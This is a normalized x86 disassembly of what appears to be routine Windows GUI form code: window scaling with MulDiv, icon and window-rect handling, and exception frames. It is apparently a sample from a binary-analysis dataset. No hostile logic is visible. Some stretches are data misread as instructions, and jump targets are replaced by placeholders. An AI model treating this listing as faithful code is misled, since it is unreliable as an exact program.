mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_454ea8
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_454ea8
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_454ff8
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_454ff8
sub_455828
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_455784
mov ecx edi
mov edx esi
mov eax ebx
call sub_44376c
pop edi
pop esi
pop ebx
retn
sub_455850
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_4558ba
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44224c
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4558c1
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_4558c1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_4558f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4554a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455900
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_455900
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_455520
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_455974
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_43cecc
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_425310
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_43ce88
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_425310
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_412cfc
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_43fccc
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4559e4
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_455a45
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4032b0
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_442fdc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455a4c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_455a74
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_455bd8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_455bb8
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_40306c
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_403448
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455bbf
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_455b80
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_413ec8
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_403074
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
call sub_4038b0
sub_455c00
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403320
and [ ebx + 0x2f4 ] 0xdf
sub_455c38
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_455244
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_43cbf4
xor edx edx
mov eax ebx
call sub_43cc18
mov edx 0x140
mov eax ebx
call sub_43cc40
mov edx 0xf0
mov eax ebx
call sub_43cc64
mov dl 0x1
mov eax [ r-xdata ]
call sub_424854
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_456554
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e79c
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_43c060
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_40306c
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_4568b8
xor edx edx
mov eax ebx
call sub_43d648
xor edx edx
mov eax ebx
call sub_43d5b0
mov dl 0x1
mov eax ebx
call sub_443da0
mov edx ebx
mov eax [ rw-data ]
call sub_45af1c
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_455db1
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_41ad1c
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_4142a4
xor edx edx
mov eax ebx
call sub_417714
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_459dc4
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_455e1c
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4034b0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_455ee6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_458740
mov eax [ ebp - 0x4 ]
call sub_443f64
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45af54
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_403124
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_403124
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40d1c0
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_4552bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455eed
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_455f00
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push j_sub_4035c4#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4568b8
sub_455f46
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_403320
test al al
jne r-xdata
call sub_40392c
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_4038d8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4568b8
sub_455f7c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push j_sub_4035c4#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_455fdc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_43f534
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_403320
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_458284
sub_456018
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43c954
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_413fac
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_45767c
mov edx esi
mov eax ebp
call sub_4142a4
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_457654
mov edx esi
mov eax edi
call sub_45767c
jmp r-xdata
xor edx edx
mov eax edi
call sub_457630
sub_456124
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4404f8
xor edx edx
push ebp
push sub_45637a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43fc54
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43cea0
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43cee4
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_4564ac
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_43e62c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456381
mov eax [ ebp - 0x4 ]
call sub_440500
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_455784
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_443724
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_455784
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_443724
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_41e060
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_41e068
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_456389
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_440fa0
push 0x0
push 0x0
push ebx
push sub_456490
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_45645c
push ebx
push sub_456474
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_45643b
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_417e0c
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_43d5b0
sub_4564c7
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_455784
mov ecx edi
mov edx esi
mov eax ebx
call sub_443724
mov eax ebx
call sub_4565b0
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_41e104
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_41e120
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_43cecc
mov ebp eax
push edi
push esi
mov eax ebx
call sub_43ce88
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_456858
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_456888
sub_456554
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_443c60
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_443f64
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_4588b4
push eax
push 0x1
push 0x80
mov eax ebx
call sub_443c60
push eax
call SendMessageA
pop ebx
retn
sub_4565e8
push ebx
mov ebx eax
mov eax ebx
call sub_457504
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_45667c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_443c60
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_443d28
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_443c60
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_443c60
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_456704
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_444204
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_41b0a0
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_41b074
mov edi eax
mov eax edi
mov si 0xfff1
call sub_403320
test al al
jne r-xdata
sub_456770
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_40306c
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_45679c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov eax ebp
call sub_440990
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_41b0a0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_44424c
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_41b074
mov si 0xfff1
call sub_403320
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_41b0b0
jmp r-xdata
sub_456830
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_43d66c
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_43e62c
sub_456858
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_43cea0
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_456888
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_43cee4
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_4568b8
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_43d3a4
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_4579f0
pop esi
pop ebx
retn
sub_4568fc
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_456955
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45695c
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
sub_456964
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_43d358
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_4411b8
mov eax ebx
call sub_441354
sub_45699c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_41aeec
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_4569dc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_441674
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403320
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_403320
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_43e62c
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_43e62c
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_43e62c
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_43e62c
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_43e62c
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_43e62c
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
